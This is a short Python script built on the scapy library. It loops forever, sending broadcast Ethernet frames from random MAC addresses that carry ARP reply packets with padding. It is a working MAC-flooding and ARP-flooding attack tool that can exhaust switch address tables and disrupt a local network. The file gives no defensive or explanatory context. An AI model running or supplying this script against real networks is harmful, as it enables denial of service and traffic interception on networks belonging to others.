#!/usr/bin/env python

import utils

from scapy.all import *


def run():
    while True:
        sendp(Ether(src=RandMAC(),
                    dst="FF:FF:FF:FF:FF:FF") /
              ARP(op=2,
                  psrc="0.0.0.0",
                  hwdst="FF:FF:FF:FF:FF:FF") /
              Padding(load="X" * 18))


if __name__ == '__main__':
    utils.config_graceful_exit()
    run()
